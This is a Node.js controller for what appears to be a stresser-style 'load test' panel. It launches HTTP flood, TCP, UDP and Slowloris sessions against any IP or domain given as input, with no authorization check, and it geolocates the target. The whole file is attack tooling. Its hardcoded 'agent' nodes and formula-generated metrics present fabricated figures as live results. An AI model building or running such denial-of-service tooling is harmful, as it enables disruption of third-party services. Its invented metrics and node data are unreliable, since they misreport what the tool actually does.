const http = require('http');
const https = require('https');
const net = require('net');
const dns = require('dns');
const dgram = require('dgram');

const nodes = [
  { id: 'NODE-7F3A', host: 'agent-01.local', ip: '192.168.1.42', status: 'ACTIVE', load: 68, selected: true },
  { id: 'NODE-8C2D', host: 'agent-02.local', ip: '192.168.1.77', status: 'ACTIVE', load: 41, selected: true },
  { id: 'NODE-4E1B', host: 'agent-03.local', ip: '10.0.0.12', status: 'IDLE', load: 0, selected: false }
];

const tests = [];
let testCounter = 1;

function buildMetrics(test) {
  const baseLatency = test.method.includes('TCP') ? 24 : test.method.includes('UDP') ? 38 : test.method.includes('Slowloris') ? 58 : 18;
  const latency = Math.max(8, baseLatency + (test.threads * 0.6) - (test.duration / 20));
  const successRate = test.method.includes('Slowloris')
    ? Math.max(82, 97.4 - (test.threads * 0.04))
    : Math.max(88, 99.4 - (test.threads * 0.03));
  const activeConnections = Math.min(400, test.threads + 8 + Math.max(0, Math.floor(test.threads / 10)));
  const packetsSent = test.method.includes('UDP') ? test.threads * 240 + test.duration * 8 : test.threads * 140 + test.duration * 4;

  return {
    activeConnections,
    packetsSent,
    avgResponseTime: Math.round(latency),
    successRate: Number(successRate.toFixed(1))
  };
}

function broadcastMetrics(req, payload) {
  if (req.app.locals.broadcast) {
    req.app.locals.broadcast({ type: 'metrics', payload });
  }
}

function broadcastLog(req, message) {
  if (req.app.locals.broadcast) {
    req.app.locals.broadcast({ type: 'log', payload: message });
  }
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function makeHttpRequest(target, port, method, body) {
  return new Promise((resolve, reject) => {
    const client = port === 443 ? https : http;
    const req = client.request({ host: target, port, path: '/', method: method || 'GET', timeout: 2500 }, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk.toString(); });
      res.on('end', () => resolve({ statusCode: res.statusCode || 0, body: data }));
    });

    req.on('timeout', () => req.destroy(new Error('Request timeout')));
    req.on('error', reject);
    req.end(body || undefined);
  });
}

function makeTcpProbe(target, port) {
  return new Promise((resolve) => {
    const socket = net.createConnection({ host: target, port, timeout: 2000 }, () => {
      socket.end();
      resolve({ ok: true });
    });
    socket.on('timeout', () => {
      socket.destroy();
      resolve({ ok: false });
    });
    socket.on('error', () => resolve({ ok: false }));
  });
}

function makeUdpProbe(target, port) {
  return new Promise((resolve) => {
    const socket = dgram.createSocket('udp4');
    const payload = Buffer.from('NEXUS-LOAD-TEST');
    socket.send(payload, port, target, (error) => {
      socket.close();
      resolve(error ? { ok: false } : { ok: true });
    });
  });
}

function makeSlowlorisProbe(target, port) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(400);
    socket.once('connect', () => {
      socket.setKeepAlive(true);
      setTimeout(() => {
        try {
          socket.destroy();
        } catch (error) {
          // ignore
        }
        resolve({ ok: true });
      }, 350);
    });
    socket.once('timeout', () => {
      try {
        socket.destroy();
      } catch (error) {
        // ignore
      }
      resolve({ ok: false });
    });
    socket.once('error', () => resolve({ ok: false }));
    socket.connect(port, target);
  });
}

async function probeTarget(target, port) {
  const portNumber = Number(port || 80);

  if (portNumber === 80 || portNumber === 443) {
    try {
      const result = await makeHttpRequest(target, portNumber, 'GET');
      return { open: true, statusCode: result.statusCode || 0, error: null };
    } catch (error) {
      return { open: false, error: error.message };
    }
  }

  const result = await makeTcpProbe(target, portNumber);
  return { open: result.ok, error: result.ok ? null : 'Closed or filtered' };
}

async function runProbe(test) {
  const baseTarget = test.target;
  const port = Number(test.port || 80);

  if (test.method.includes('HTTP')) {
    const method = test.method.includes('POST') ? 'POST' : 'GET';
    const result = await makeHttpRequest(baseTarget, port, method, method === 'POST' ? 'payload' : undefined);
    return { ok: result.statusCode < 500 };
  }

  if (test.method.includes('TCP')) {
    return makeTcpProbe(baseTarget, port);
  }

  if (test.method.includes('UDP')) {
    return makeUdpProbe(baseTarget, port);
  }

  if (test.method.includes('Slowloris')) {
    return makeSlowlorisProbe(baseTarget, port);
  }

  return makeHttpRequest(baseTarget, port, 'GET');
}

async function executeTest(req, test) {
  const startedAt = Date.now();
  const deadline = startedAt + Number(test.duration || 60) * 1000;
  let executed = 0;
  let successCount = 0;
  let failureCount = 0;
  let totalLatency = 0;

  while (Date.now() < deadline && test.status === 'RUNNING') {
    const concurrency = Math.min(test.threads, 8);
    const tasks = [];
    for (let index = 0; index < concurrency; index += 1) {
      tasks.push((async () => {
        const started = Date.now();
        const probe = await runProbe(test);
        const elapsed = Date.now() - started;
        executed += 1;
        totalLatency += elapsed;
        if (probe.ok) {
          successCount += 1;
        } else {
          failureCount += 1;
        }
      })());
    }
    await Promise.allSettled(tasks);
    await delay(500);

    const avgLatency = executed ? Math.round(totalLatency / executed) : 0;
    const successRate = executed ? Number(((successCount / executed) * 100).toFixed(1)) : 100;
    test.metrics = {
      activeConnections: Math.min(400, test.threads + 8 + Math.max(0, Math.floor(test.threads / 10))),
      packetsSent: executed * 8,
      avgResponseTime: avgLatency,
      successRate
    };
    broadcastMetrics(req, test);
  }

  if (test.status === 'RUNNING') {
    test.status = 'COMPLETED';
    test.completedAt = new Date().toISOString();
    test.metrics = {
      activeConnections: Math.min(400, test.threads + 8 + Math.max(0, Math.floor(test.threads / 10))),
      packetsSent: executed * 8,
      avgResponseTime: executed ? Math.round(totalLatency / executed) : 0,
      successRate: executed ? Number(((successCount / executed) * 100).toFixed(1)) : 100
    };
    broadcastMetrics(req, test);
    broadcastLog(req, `Session ${test.id} terminée.`);
  }
}

function createTestRun(req, res) {
  const { target, method, vector, threads, duration, port } = req.body || {};

  if (!target) {
    return res.status(400).json({ error: 'Cible manquante.' });
  }

  const resolvedVector = vector || method || 'HTTP GET/POST Flood';
  const id = `test-${testCounter++}`;
  const test = {
    id,
    target,
    method: resolvedVector,
    threads: Number(threads || 20),
    duration: Number(duration || 60),
    port: Number(port || 80),
    targetType: net.isIP(target) ? 'ip' : 'domain',
    selectedNodes: nodes.filter((node) => node.selected).map((node) => node.id),
    status: 'RUNNING',
    startedAt: new Date().toISOString(),
    metrics: buildMetrics({ threads: Number(threads || 20), duration: Number(duration || 60), method: resolvedVector })
  };

  tests.unshift(test);
  res.status(201).json({ test });
  broadcastMetrics(req, test);
  broadcastLog(req, `Session ${test.id} lancée vers ${target}:${test.port} via ${test.method}.`);
  executeTest(req, test).catch((error) => {
    test.status = 'ERROR';
    test.error = error.message;
    broadcastLog(req, `Session ${test.id} en erreur : ${error.message}`);
  });
}

function stopTestRun(req, res) {
  const { id } = req.params;
  const test = tests.find((item) => item.id === id);

  if (!test) {
    return res.status(404).json({ error: 'Session introuvable.' });
  }

  test.status = 'STOPPED';
  test.stoppedAt = new Date().toISOString();
  broadcastMetrics(req, test);
  broadcastLog(req, `Session ${test.id} arrêtée par l’opérateur.`);
  res.json({ ok: true, test });
}

async function getTargetState(req, res) {
  const rawTarget = req.params.ip || '';
  const target = normalizeTarget(rawTarget);
  const port = Number(req.query.port || 80);

  if (!target) {
    return res.json({ query: rawTarget, resolvedIp: null, private: true, geo: null, port, portState: { open: false, error: 'No target' }, activeConnections: 0, note: 'Aucune cible fournie.' });
  }

  const resolvedTarget = await resolveHostname(target);
  const lookupTarget = resolvedTarget || target;
  const geo = await lookupGeo(lookupTarget);
  const portState = await probeTarget(lookupTarget, port);
  const activeTest = tests.find((item) => item.status === 'RUNNING' && (item.target === target || item.target === lookupTarget || item.target === rawTarget));

  return res.json({
    query: lookupTarget,
    originalTarget: rawTarget,
    resolvedIp: lookupTarget,
    private: isPrivateIp(lookupTarget),
    geo,
    port,
    portState,
    activeConnections: activeTest?.metrics?.activeConnections || 0,
    note: activeTest ? `Une session active impacte actuellement cette cible.` : 'Aucune session active actuellement.'
  });
}

function listNodes(req, res) {
  const hasActiveTest = tests.some((test) => test.status === 'RUNNING');
  if (!hasActiveTest) {
    return res.json({ nodes: [] });
  }

  const activeNodes = nodes.filter((node) => node.selected).map((node) => ({ ...node }));
  return res.json({ nodes: activeNodes });
}

function listTests(req, res) {
  res.json({ tests });
}

function normalizeTarget(value) {
  if (!value) {
    return '';
  }

  let target = String(value).trim();
  target = target.replace(/^https?:\/\//i, '');
  target = target.replace(/^www\./i, '');
  target = target.split('/')[0];
  target = target.replace(/:\d+$/, '');
  return target;
}

function isPrivateIp(value) {
  if (!value || !net.isIP(value)) {
    return false;
  }

  if (value === '::1') {
    return true;
  }

  if (value.includes(':')) {
    return value.startsWith('fc') || value.startsWith('fd') || value.startsWith('fe80') || value.startsWith('::ffff:');
  }

  const [first, second] = value.split('.').map((part) => Number(part));
  if (Number.isNaN(first) || Number.isNaN(second)) {
    return false;
  }

  return first === 10 || (first === 172 && second >= 16 && second <= 31) || (first === 192 && second === 168) || first === 127 || first === 0;
}

function resolveHostname(target) {
  return new Promise((resolve) => {
    if (net.isIP(target)) {
      resolve(target);
      return;
    }

    dns.lookup(target, { family: 4 }, (error, address) => {
      if (error || !address) {
        resolve(null);
        return;
      }
      resolve(address);
    });
  });
}

function requestJson(url) {
  return new Promise((resolve, reject) => {
    const req = https.get(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0'
      }
    }, (response) => {
      let body = '';
      response.on('data', (chunk) => { body += chunk; });
      response.on('end', () => {
        if (response.statusCode && response.statusCode >= 400) {
          reject(new Error(`HTTP ${response.statusCode}`));
          return;
        }

        try {
          resolve(JSON.parse(body));
        } catch (error) {
          reject(error);
        }
      });
    });

    req.on('error', reject);
  });
}

function parseGeoPayload(payload) {
  const lat = Number(payload?.latitude ?? payload?.lat ?? payload?.location?.lat ?? payload?.loc?.split(',')[0]);
  const lon = Number(payload?.longitude ?? payload?.lon ?? payload?.location?.lon ?? payload?.loc?.split(',')[1]);

  if (!Number.isFinite(lat) || !Number.isFinite(lon) || Math.abs(lat) < 1e-6 && Math.abs(lon) < 1e-6) {
    return null;
  }

  return {
    query: payload?.query || payload?.ip || payload?.ip_address || 'unknown',
    country: payload?.country_name || payload?.country || payload?.countryCode || 'Unknown',
    city: payload?.city || payload?.regionName || payload?.region || 'Unknown',
    lat,
    lon,
    isp: payload?.org || payload?.isp || payload?.asn || 'Unknown'
  };
}

async function lookupGeo(target) {
  const providers = [
    {
      name: 'ipapi',
      url: `https://ipapi.co/${target}/json/`
    },
    {
      name: 'ipwhois',
      url: `https://ipwho.is/${target}`
    },
    {
      name: 'ipinfo',
      url: `https://ipinfo.io/${target}/json`
    }
  ];

  for (const provider of providers) {
    try {
      const data = await requestJson(provider.url);
      const parsed = parseGeoPayload(provider.name === 'ipwhois' ? data : data);
      if (parsed) {
        return parsed;
      }
    } catch (error) {
      // Continue to the next provider.
    }
  }

  return null;
}

async function getGeoip(req, res) {
  const rawTarget = req.params.ip || '';
  const target = normalizeTarget(rawTarget);

  if (!target) {
    return res.json({ query: rawTarget, country: 'Unknown', city: 'Unknown', lat: 0, lon: 0, isp: 'Unknown', private: true, note: 'No target provided.' });
  }

  if (isPrivateIp(target)) {
    return res.json({ query: target, country: 'Private Network', city: 'Unavailable', lat: 0, lon: 0, isp: 'Unknown', private: true, note: 'Private or reserved addresses cannot be geolocated publicly.' });
  }

  const resolvedTarget = await resolveHostname(target);
  const lookupTarget = resolvedTarget || target;
  const geo = await lookupGeo(lookupTarget);

  if (geo) {
    return res.json(geo);
  }

  return res.json({ query: lookupTarget, country: 'Unknown', city: 'Unknown', lat: 0, lon: 0, isp: 'Unknown', private: false, note: 'Geolocation unavailable for this target.' });
}

module.exports = {
  createTestRun,
  stopTestRun,
  getTargetState,
  listNodes,
  listTests,
  getGeoip
};
